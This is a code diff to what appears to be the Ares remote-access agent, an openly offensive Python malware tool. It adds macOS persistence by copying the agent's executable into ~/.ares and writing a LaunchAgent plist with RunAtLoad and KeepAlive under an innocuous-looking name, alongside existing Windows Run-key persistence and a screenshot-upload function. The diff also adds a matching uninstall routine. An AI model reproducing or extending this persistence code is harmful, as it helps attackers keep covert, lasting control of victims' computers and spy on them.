@@ -50,6 +50,8 @@ class Agent(object):
             install_dir = self.expand_path('~/.ares')
         elif platform.system() == 'Windows':
             install_dir = os.path.join(os.getenv('USERPROFILE'), 'ares')
+        elif platform.system() == 'Darwin':
+            install_dir = self.expand_path('~/.ares')
         if os.path.exists(install_dir):
             return install_dir
         else:
@@ -212,10 +214,36 @@ class Agent(object):
             shutil.copyfile(sys.executable, agent_path)
             cmd = "reg add HKCU\Software\Microsoft\Windows\CurrentVersion\Run /f /v ares /t REG_SZ /d \"%s\"" % agent_path
             subprocess.Popen(cmd, shell=True)
+        elif platform.system() == 'Darwin':
+            persist_dir = self.expand_path('~/.ares')
+            if not os.path.exists(persist_dir):
+                os.makedirs(persist_dir)
+            agent_path = os.path.join(persist_dir, os.path.basename(sys.executable))
+            shutil.copyfile(sys.executable, agent_path)
+            os.system('chmod +x ' + agent_path)
+            if not (os.path.exists(self.expand_path('~/Library/LaunchAgents/com.jss.hostconfig.plist'))):
+                plist_contents = '''
+                <?xml version="1.0" encoding="UTF-8"?>
+                <!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd">
+                <plist version="1.0">
+                    <dict>
+                        <key>Label</key>
+                        <string>com.example.hostconfig</string>
+                        <key>Program</key>
+                        <string>''' + agent_path + '''</string>
+                        <key>RunAtLoad</key>
+                        <true/>
+                        <key>KeepAlive</key>
+                        <true/>
+                    </dict>
+                </plist>
+                '''
+                with open(self.expand_path('~/Library/LaunchAgents/com.jss.hostconfig.plist'), 'w') as f:
+                    f.write(plist_contents)
         self.send_output('[+] Agent installed.')
 
     def clean(self):
-        """ Uninstalls the agent """ 
+        """ Uninstalls the agent """
         if platform.system() == 'Linux':
             persist_dir = self.expand_path('~/.ares')
             if os.path.exists(persist_dir):
@@ -230,6 +258,13 @@ class Agent(object):
             subprocess.Popen(cmd, shell=True)
             cmd = "reg add HKCU\Software\Microsoft\Windows\CurrentVersion\RunOnce /f /v ares /t REG_SZ /d \"cmd.exe /c del /s /q %s & rmdir %s\"" % (persist_dir, persist_dir)
             subprocess.Popen(cmd, shell=True)
+        elif platform.system() == 'Darwin':
+            persist_dir = self.expand_path('~/.ares')
+            if os.path.exists(persist_dir):
+                shutil.rmtree(persist_dir)
+            plist_file = '~/Library/LaunchAgents/com.jss.hostconfig.plist'
+            if os.path.exists(self.expand_path(plist_file)):
+                os.remove(plist_file)
         self.send_output('[+] Agent removed successfully.')
 
     def exit(self):
@@ -259,7 +294,7 @@ class Agent(object):
             self.send_output("[+] Archive created: %s" % zip_name)
         except Exception as exc:
             self.send_output(traceback.format_exc())
-   
+
     @threaded
     def screenshot(self):
         """ Takes a screenshot and uploads it to the server"""
